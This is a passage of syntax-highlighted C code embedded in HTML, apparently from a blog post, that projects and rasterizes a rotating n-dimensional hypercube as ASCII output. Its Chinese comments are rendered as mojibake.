ä¸´æ—¶</span></span><br><span class="line">    <span class="keyword">float</span> normalResultSet[<span class="number">6</span>*face];<span class="comment">//æ³•å‘é‡ç»“æœé›†</span></span><br><span class="line">    <span class="built_in">memset</span>(vexLink,<span class="number">0xff</span>,<span class="keyword">sizeof</span>(vexLink));<span class="comment">//åˆå§‹åŒ–</span></span><br><span class="line">    <span class="built_in">memset</span>(normalLink,<span class="number">0xff</span>,<span class="keyword">sizeof</span>(normalLink));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;vexNum;i++) vex[i]=a;</span><br><span class="line">    vex[dimension]=-a;<span class="comment">//è¿™ä¸ªç®—æ³•éœ€è¦æœ‰å‰è½¦ä¹‹é‰´</span></span><br><span class="line">    <span class="comment">/*å¾—åˆ°é¡¶ç‚¹åæ ‡</span></span><br><span class="line"><span class="comment">    ç”¨ä¸Šä¸€å‘é‡ä¸€ä¸ªå…ƒç´ å˜å·ï¼Œä½¿å…¶ä¸ä¹‹å‰ä»»ä¸€å‘é‡éƒ½ä¸åŒï¼Œè¯¥å‘é‡å³è¦æ‰¾çš„ä¸‹ä¸€ä¸ªé¡¶ç‚¹</span></span><br><span class="line"><span class="comment">    å‘é‡ä¸åŒ = å…ƒç´ è‡³å°‘æœ‰ä¸€ä¸ªä¸ç›¸åŒ*/</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">2</span>,difference,sign,i;vexIndex*dimension&lt;vexNum;vexIndex++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(sign=<span class="number">0</span>;sign&lt;dimension;sign++)&#123;<span class="comment">//éå†å°è¯•æ”¹å˜vexIndex-1å‘é‡çš„æ¯ä¸€å•ä¸ªå…ƒç´ æ­£è´Ÿå·ï¼Œæ‰§è¡Œæ¡ä»¶ï¼šdä¸ºå‡</span></span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;vexIndex<span class="number">-1</span>;i++)&#123;difference=<span class="number">0</span>;<span class="comment">//éå†æ¯ä¸ªå‘é‡ï¼Œæ‰§è¡Œæ¡ä»¶ï¼šdä¸ºçœŸï¼Œæ¯æ¬¡åˆå§‹åŒ–dä¸ºå‡</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;dimension&amp;&amp;!difference;k++)<span class="comment">//éå†æ¯”è¾ƒvexIndex-1å‘é‡ä¸ä¹‹å‰å‘é‡çš„å…ƒç´ </span></span><br><span class="line">                    <span class="keyword">if</span>(sign==k?vex[i*dimension+k]!=<span class="number">-1</span>*vex[(vexIndex<span class="number">-1</span>)*dimension+k]:vex[i*dimension+k]!=vex[(vexIndex<span class="number">-1</span>)*dimension+k]) difference=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(!difference) <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(difference) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;dimension;k++) vex[vexIndex*dimension+k]=k==sign?<span class="number">-1</span>*vex[(vexIndex<span class="number">-1</span>)*dimension+k]:vex[(vexIndex<span class="number">-1</span>)*dimension+k];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*æµ‹è¯•ä»£ç ï¼šæ‰“å°vex</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;vexNum/dimension;i++)&#123;</span></span><br><span class="line"><span class="comment">        if(i&lt;10) printf(&quot; %d= &quot;,i);</span></span><br><span class="line"><span class="comment">        else printf(&quot;%d= &quot;,i);</span></span><br><span class="line"><span class="comment">        for(int j=0;j&lt;dimension;j++)&#123;</span></span><br><span class="line"><span class="comment">            if(vex[i*dimension+j]&gt;=0)printf(&quot; %.0f,&quot;,vex[i*dimension+j]);</span></span><br><span class="line"><span class="comment">            else printf(&quot;%.0f,&quot;,vex[i*dimension+j]);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    printf(&quot;Vex Above\n&quot;);</span></span><br><span class="line"><span class="comment">    //*/</span></span><br><span class="line">    <span class="comment">/*å¾—åˆ°ç›¸é‚»é¡¶ç‚¹ï¼Œç›¸é‚»é¡¶ç‚¹åœ¨vexä¸­çš„indexå­˜å‚¨åˆ°vexLinkä¸­</span></span><br><span class="line"><span class="comment">    å…ˆåœ¨vexLinkä¸­å·²ç»å»ºç«‹linkçš„éƒ¨åˆ†æ‰¾æœ‰æ²¡æœ‰ä¹‹å‰linkåˆ°è¿‡å½“å‰æ­£åœ¨å»ºç«‹linkçš„ç‚¹ï¼Œæœ‰åˆ™ç›´æ¥åŠ å…¥å½“å‰çš„link</span></span><br><span class="line"><span class="comment">    linkIndexï¼šè¿™æ˜¯ç¬¬å‡ ä¸ªå·²ç»å»ºç«‹linkçš„ç‚¹</span></span><br><span class="line"><span class="comment">    åœ¨linkæ•°é‡è¾¾åˆ°dimensionä¹‹å‰ï¼Œç”¨å½“å‰å‘é‡ä¸ä¹‹å‰çš„å‘é‡ä½œæ¯”è¾ƒï¼Œå¦‚æœ_åª_æ›´_æ”¹_ä¸€_ä¸ª_ç¬¦_å·_å°±å¯ä»¥åŒ¹é…ï¼Œåˆ™åŠ å…¥linkï¼Œç›´åˆ°å½“å‰å‘é‡çš„linkæ»¡dimensionä¸ª*/</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>,n=<span class="number">0</span>;vexIndex*dimension&lt;vexNum;vexIndex++,n=<span class="number">0</span>)&#123;<span class="comment">//vexIndexï¼šå½“å‰æ­£åœ¨å»ºç«‹linkçš„ç‚¹ | nï¼šå·²ç»å»ºç«‹åˆ°ç¬¬å‡ ä¸ªlinkäº†</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> linkIndex=<span class="number">0</span>;linkIndex&lt;vexIndex;linkIndex++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension;i++)</span><br><span class="line">                <span class="keyword">if</span>(vexLink[linkIndex*dimension+i]==vexIndex) vexLink[vexIndex*dimension+n++]=linkIndex;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=vexIndex+<span class="number">1</span>,difference=<span class="number">0</span>,tooManyDiff,sign;i*dimension&lt;vexNum&amp;&amp;n!=dimension;i++,difference=<span class="number">0</span>)&#123;<span class="comment">//éå†å½“å‰å‘é‡ä¹‹åçš„æ¯ä¸ªå‘é‡ || differenceï¼šå­˜åœ¨ä¸ä¸€æ ·çš„å…ƒç´ çš„æ•°é‡</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;dimension&amp;&amp;difference&lt;=<span class="number">1</span>;k++)<span class="comment">//éå†è¢«æ¯”è¾ƒå‘é‡ä¸­çš„æ¯ä¸ªå…ƒç´ </span></span><br><span class="line">                <span class="keyword">if</span>(vex[i*dimension+k]!=vex[vexIndex*dimension+k]) difference++;</span><br><span class="line">            <span class="keyword">if</span>(difference==<span class="number">1</span>) vexLink[vexIndex*dimension+n++]=i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*æµ‹è¯•ä»£ç ï¼šæ‰“å°vexLink</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;vexNum/dimension;i++)&#123;</span></span><br><span class="line"><span class="comment">        if(i&lt;10) printf(&quot; %d= &quot;,i);</span></span><br><span class="line"><span class="comment">        else printf(&quot;%d= &quot;,i);</span></span><br><span class="line"><span class="comment">        for(int j=0;j&lt;dimension;j++)&#123;</span></span><br><span class="line"><span class="comment">            if(vexLink[i*dimension+j]&gt;=10)printf(&quot;%d, &quot;,vexLink[i*dimension+j]);</span></span><br><span class="line"><span class="comment">            else printf(&quot; %d ,&quot;,vexLink[i*dimension+j]);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    printf(&quot;vexLink Above\n&quot;);</span></span><br><span class="line"><span class="comment">    //*/</span></span><br><span class="line">    <span class="comment">//å¾—åˆ°é¢å¯¹åº”çš„ä¸‰ä¸ªç‚¹</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> cur1=<span class="number">0</span>,normalIndex=<span class="number">0</span>;cur1&lt;vexNum/dimension&amp;&amp;normalIndex!=<span class="number">2</span>*face;cur1+=<span class="number">2</span>)<span class="comment">//cur n è¡¨ç¤ºæŒ‡å‘ç¬¬å‡ ä¸ªé¡¶ç‚¹ï¼ŒnormalIndexè¡¨è¿™æ˜¯å·²ç»æ‰¾åˆ°çš„ç¬¬å‡ ä¸ªä¸‰è§’å½¢</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> cur2=<span class="number">0</span>,pDiag=<span class="number">0</span>;cur2&lt;vexNum/dimension&amp;&amp;normalIndex!=<span class="number">2</span>*face;cur2++)&#123;<span class="comment">//pDiag(Plane Diagonal)è¡¨æ˜¯å¦ä¸ºå¹³é¢å¯¹è§’ç‚¹ï¼Œå³cur1é€šè¿‡Linkç´¢å¼•ï¼Œåœ¨ç¬¬äºŒæ¬¡å¯ä»¥ç´¢å¼•åˆ°cur2</span></span><br><span class="line">            <span class="keyword">if</span>(cur1==cur2) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension&amp;&amp;!pDiag;i++)<span class="comment">//ç¬¬ä¸€æ¬¡ç´¢å¼•çš„åç§»</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;dimension&amp;&amp;!pDiag;j++)<span class="comment">//ç¬¬äºŒæ¬¡ç´¢å¼•çš„åç§»</span></span><br><span class="line">                    <span class="keyword">if</span>(vexLink[vexLink[cur1*dimension+i]*dimension+j]==cur2) pDiag=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(pDiag)&#123;</span><br><span class="line">                <span class="keyword">int</span> <span class="keyword">public</span>[dimension<span class="number">-1</span>];</span><br><span class="line">                <span class="built_in">memset</span>(<span class="keyword">public</span>,<span class="number">0xff</span>,<span class="keyword">sizeof</span>(<span class="keyword">public</span>));</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,k=<span class="number">0</span>;i&lt;dimension&amp;&amp;k&lt;dimension<span class="number">-1</span>;i++)</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;dimension&amp;&amp;k&lt;dimension<span class="number">-1</span>;j++)</span><br><span class="line">                        <span class="keyword">if</span>(vexLink[cur1*dimension+i]==vexLink[cur2*dimension+j]) <span class="keyword">public</span>[k++]=vexLink[cur1*dimension+i];</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=normalIndex;i++)<span class="comment">//iæŒ‡å‘normalLinkä¸­çš„å‘é‡</span></span><br><span class="line">                    <span class="keyword">if</span>  (   (cur1==normalLink[i*<span class="number">3</span>]||cur1==normalLink[i*<span class="number">3</span>+<span class="number">1</span>]||cur1==normalLink[i*<span class="number">3</span>+<span class="number">2</span>])<span class="comment">//cur1ä¸ç¬¬iä¸ªnormalLinkä¸­å­˜åœ¨å…ƒç´ é‡åˆï¼Ÿ</span></span><br><span class="line">                        &amp;&amp;  (cur2==normalLink[i*<span class="number">3</span>]||cur2==normalLink[i*<span class="number">3</span>+<span class="number">1</span>]||cur2==normalLink[i*<span class="number">3</span>+<span class="number">2</span>]))<span class="comment">//cur2ä¸ç¬¬iä¸ªnormalLinkä¸­å­˜åœ¨å…ƒç´ é‡åˆï¼Ÿ</span></span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;dimension<span class="number">-1</span>;j++)</span><br><span class="line">                            <span class="keyword">if</span>(<span class="keyword">public</span>[j]==normalLink[i*<span class="number">3</span>]||<span class="keyword">public</span>[j]==normalLink[i*<span class="number">3</span>+<span class="number">1</span>]||<span class="keyword">public</span>[j]==normalLink[i*<span class="number">3</span>+<span class="number">2</span>]) <span class="keyword">public</span>[j]=<span class="number">-1</span>;<span class="comment">//public[j]ä¸ç¬¬iä¸ªnormalLinkä¸­å­˜åœ¨å…ƒç´ é‡åˆï¼Ÿ</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension<span class="number">-1</span>;i++)</span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">public</span>[i]!=<span class="number">-1</span>)&#123;</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">3</span>;j++)normalLink[normalIndex*<span class="number">3</span>+j]=j==<span class="number">0</span>?cur1:j==<span class="number">1</span>?cur2:<span class="keyword">public</span>[i];</span><br><span class="line">                        normalIndex++;</span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">/*æµ‹è¯•ä»£ç ï¼šæ‰“å°normalLink</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;2*face;i++)&#123;</span></span><br><span class="line"><span class="comment">        //if(i&lt;10) printf(&quot; %d= &quot;,i);</span></span><br><span class="line"><span class="comment">        //else printf(&quot;%d= &quot;,i);</span></span><br><span class="line"><span class="comment">        for(int j=0;j&lt;3;j++)&#123;</span></span><br><span class="line"><span class="comment">            if(normalLink[i*3+j]&gt;=10) printf(&quot;%d, &quot;,normalLink[i*3+j]);</span></span><br><span class="line"><span class="comment">            else printf(&quot;0%d, &quot;,normalLink[i*3+j]);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    printf(&quot;normalLink Above\n&quot;);</span></span><br><span class="line"><span class="comment">    //*/</span></span><br><span class="line">    <span class="built_in">memcpy</span>(vexTemp,vex,<span class="keyword">sizeof</span>(vex[<span class="number">0</span>])*vexNum);</span><br><span class="line">    <span class="built_in">memcpy</span>(vexO,vex,<span class="keyword">sizeof</span>(vex[<span class="number">0</span>])*vexNum);</span><br><span class="line">    <span class="comment">//=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">float</span> angle=<span class="number">0</span>;;angle+=deltaA)&#123;<span class="comment">//å¤§å¾ªç¯</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)&#123;</span><br><span class="line">                out_f[i][j]=<span class="number">-1</span>;</span><br><span class="line">                dis[i][j]=(<span class="keyword">float</span>)(<span class="number">-4.0</span>*size);</span><br><span class="line">            &#125;<span class="comment">//åˆå§‹åŒ–</span></span><br><span class="line">        <span class="built_in">memcpy</span>(vex,vexO,<span class="keyword">sizeof</span>(vexO));<span class="comment">//è¿˜åŸvexåˆ°åˆå§‹çŠ¶æ€ï¼Œå¦åˆ™å¸¦è§’åŠ é€Ÿåº¦</span></span><br><span class="line">        <span class="comment">//è®¡ç®—å‘é‡ä¸æ—‹è½¬çŸ©é˜µç›¸ä¹˜ï¼Œ0å¤ªå¤šï¼Œæ²¡å¿…è¦æçœŸæ­£çš„çŸ©é˜µä¹˜æ³•</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> rotationIndex=<span class="number">0</span>,r_i=<span class="number">0</span>;rotationIndex&lt;<span class="keyword">sizeof</span>(rotateAround)/<span class="keyword">sizeof</span>(rotateAround[<span class="number">0</span>])/<span class="number">2</span>;rotationIndex++,r_i=<span class="number">0</span>)&#123;<span class="comment">//é™å®šæ—‹è½¬æ¬¡æ•°ï¼›rotateAroundæ¯è¡Œ2ä¸ªå…ƒç´ ï¼Œjçš„ä½œç”¨æ˜¯é€‰å–ä»–ä»¬</span></span><br><span class="line">                <span class="built_in">memcpy</span>(vexTemp,vex,<span class="keyword">sizeof</span>(vex));</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension;i++)<span class="comment">//éå†æ‰€æœ‰çš„è½´</span></span><br><span class="line">                    <span class="keyword">if</span>(i==rotateAround[rotationIndex*<span class="number">2</span>+r_i])<span class="comment">//å½“å‰è½´æ˜¯è¢«æ—‹è½¬è½´æ—¶ï¼Œç»“æœç¬¦åˆæ—‹è½¬çŸ©é˜µè®¡ç®—ç»“æœ</span></span><br><span class="line">                        vex[vexIndex*dimension+i]=vexTemp[vexIndex*dimension+i]*<span class="built_in">cos</span>(vAxis[rotationIndex]*angle)+vexTemp[vexIndex*dimension+rotateAround[rotationIndex*<span class="number">2</span>+!r_i]]*<span class="built_in">sin</span>(vAxis[rotationIndex]*angle)*(<span class="number">1</span><span class="number">-2</span>*r_i++);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;<span class="comment">//æ‘„åƒæœºæ—‹è½¬</span></span><br><span class="line">            <span class="built_in">memcpy</span>(vexTemp,vex,<span class="keyword">sizeof</span>(vex));</span><br><span class="line">            <span class="keyword">int</span> c=!(i^<span class="number">1</span>),b=i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++) vex[vexIndex*dimension+!(i^<span class="number">1</span>)] = vexTemp[vexIndex*dimension+!(i^<span class="number">1</span>)]*<span class="built_in">cos</span>(initialCam[i]) + vexTemp[vexIndex*dimension+(i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>)]*<span class="built_in">sin</span>(initialCam[i]);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++) vex[vexIndex*dimension+(i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>)] = vexTemp[vexIndex*dimension+(i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>)]*<span class="built_in">cos</span>(initialCam[i]) - vexTemp[vexIndex*dimension+!(i^<span class="number">1</span>)]*<span class="built_in">sin</span>(initialCam[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//ä»¥é€è§†æŠ•å½±é™ç»´</span></span><br><span class="line">        <span class="keyword">float</span> xyBefore[<span class="number">2</span>*vexNum];<span class="comment">//å¤‡ä»½xï¼Œyè½´ç”¨äºè®¡ç®—å¹³é¢æ–¹ç¨‹</span></span><br><span class="line">        <span class="built_in">memcpy</span>(vexProjected,vex,<span class="keyword">sizeof</span>(vex[<span class="number">0</span>])*vexNum);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> d=dimension<span class="number">-1</span>;d&gt;=<span class="number">2</span>;d--)&#123;<span class="comment">//d+1 = å½“å‰ç»´æ•°</span></span><br><span class="line">            <span class="keyword">if</span>(d==<span class="number">2</span>)&#123;<span class="comment">//è¶è¿˜åœ¨ä¸‰ç»´çš„æ—¶å€™å…ˆæŠŠæ³•å‘é‡ç®—äº†ï¼Œä¸ç„¶åå…‰çš„é¢å°±ä¹Ÿé€è§†äº†</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;vexNum/dimension;i++) <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=<span class="number">1</span>;j++) xyBefore[i*<span class="number">2</span>+j]=vexProjected[i*dimension+j];</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> normalIndex=<span class="number">0</span>;normalIndex&lt;<span class="number">2</span>*face;normalIndex++)&#123;</span><br><span class="line">                    <span class="keyword">float</span> vec1[<span class="number">3</span>],vec2[<span class="number">3</span>];</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">                        vec1[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension+i]-vexProjected[normalLink[normalIndex*<span class="number">3</span>+<span class="number">1</span>]*dimension+i];</span><br><span class="line">                        vec2[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension+i]-vexProjected[normalLink[normalIndex*<span class="number">3</span>+<span class="number">2</span>]*dimension+i];</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) normalResultSet[<span class="number">3</span>*normalIndex+i]=vec1[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">0</span>]*vec2[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">1</span>]-vec1[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">1</span>]*vec2[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">0</span>];</span><br><span class="line">                    <span class="keyword">float</span> normalLength=calLength(&amp;normalResultSet[<span class="number">3</span>*normalIndex],<span class="number">3</span>);</span><br><span class="line">                    <span class="keyword">if</span>(normalLength!=<span class="number">0</span>)</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) normalResultSet[<span class="number">3</span>*normalIndex+i]/=normalLength;</span><br><span class="line">                    <span class="keyword">if</span>(!transparent)&#123;<span class="comment">//ä»¥å…¨å±€è´¨å¿ƒè®¡ç®—ï¼Œä½¿æ³•å‘é‡å‘å¤–</span></span><br><span class="line">                        <span class="keyword">float</span> slidedVec[<span class="number">3</span>],slideLength,vexLength=calLength(&amp;vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension],<span class="number">3</span>);</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) slidedVec[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension+i]+normalResultSet[<span class="number">3</span>*normalIndex+i];</span><br><span class="line">                        slideLength=calLength(slidedVec,<span class="number">3</span>);</span><br><span class="line">                        <span class="keyword">if</span>(slideLength&gt;vexLength)</span><br><span class="line">                            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) normalResultSet[<span class="number">3</span>*normalIndex+i]*=<span class="number">-1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++)<span class="comment">//vexIndexï¼šç¬¬å‡ ä¸ªå‘é‡ï¼Œaxisï¼šè¯¥å‘é‡çš„ç¬¬å‡ ä¸ªå…ƒç´ </span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> axis=<span class="number">0</span>;axis&lt;d;axis++) vexProjected[vexIndex*dimension+axis]=vexProjected[vexIndex*dimension+axis]*lightSrcDis/(lightSrcDis-vexProjected[vexIndex*dimension+d]);</span><br><span class="line">            <span class="comment">/*æµ‹è¯•ä»£ç ï¼šæ‰“å°vexProjected</span></span><br><span class="line"><span class="comment">            for(int i=0;i&lt;vexNum/dimension&amp;&amp;d&gt;2;i++)&#123;</span></span><br><span class="line"><span class="comment">                if(i&lt;10) printf(&quot; %d= &quot;,i);</span></span><br><span class="line"><span class="comment">                else printf(&quot;%d= &quot;,i);</span></span><br><span class="line"><span class="comment">                for(int j=0;j&lt;dimension;j++)&#123;</span></span><br><span class="line"><span class="comment">                    if(vexProjected[i*dimension+j]&gt;=0)printf(&quot; %.2f,&quot;,vexProjected[i*dimension+j]);</span></span><br><span class="line"><span class="comment">                    else printf(&quot;%.2f,&quot;,vexProjected[i*dimension+j]);</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment">                printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">            if(d&gt;2) printf(&quot;VexPorjected Above , dimension = %d\n&quot;,d);</span></span><br><span class="line"><span class="comment">            //*/</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//è¾“å‡ºåˆ°out_f[]</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> sx=<span class="number">0</span>;sx&lt;size;sx++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> sy=<span class="number">0</span>;sy&lt;size;sy++)</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> normalIndex=<span class="number">0</span>,inside=<span class="number">1</span>;normalIndex&lt;<span class="number">2</span>*face;normalIndex++,inside=<span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="keyword">float</span> tCenter[<span class="number">2</span>]=&#123;<span class="number">0</span>&#125;;<span class="comment">//å½“å‰ä¸‰è§’å½¢è´¨å¿ƒ</span></span><br><span class="line">                    <span class="keyword">float</span> x[<span class="number">3</span>],y[<span class="number">3</span>],z[<span class="number">3</span>],xb[<span class="number">3</span>],yb[<span class="number">3</span>];</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">                        x[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>+i]*dimension];</span><br><span class="line">                        tCenter[<span class="number">0</span>]+=x[i];</span><br><span class="line">                        y[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>+i]*dimension+<span class="number">1</span>];</span><br><span class="line">                        tCenter[<span class="number">1</span>]+=y[i];</span><br><span class="line">                        z[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>+i]*dimension+<span class="number">2</span>];</span><br><span class="line">                        xb[i]=xyBefore[normalLink[normalIndex*<span class="number">3</span>+i]*<span class="number">2</span>];</span><br><span class="line">                        yb[i]=xyBefore[normalLink[normalIndex*<span class="number">3</span>+i]*<span class="number">2</span>+<span class="number">1</span>];</span><br><span class="line">                    &#125;</span><br><span class="line">                    tCenter[<span class="number">0</span>]/=<span class="number">3</span>;</span><br><span class="line">                    tCenter[<span class="number">1</span>]/=<span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>&amp;&amp;inside;i++)&#123;<span class="comment">//åˆ¤æ–­å½“å‰å±å¹•çš„ç‚¹æ˜¯å¦åœ¨ä¸‰è§’å½¢èŒƒå›´å†…</span></span><br><span class="line">                        <span class="keyword">if</span>(     ((tCenter[<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])&lt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(tCenter[<span class="number">0</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])</span><br><span class="line">                                ?(sy-move-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])&gt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(sx-move-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])</span><br><span class="line">                                :(sy-move-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span 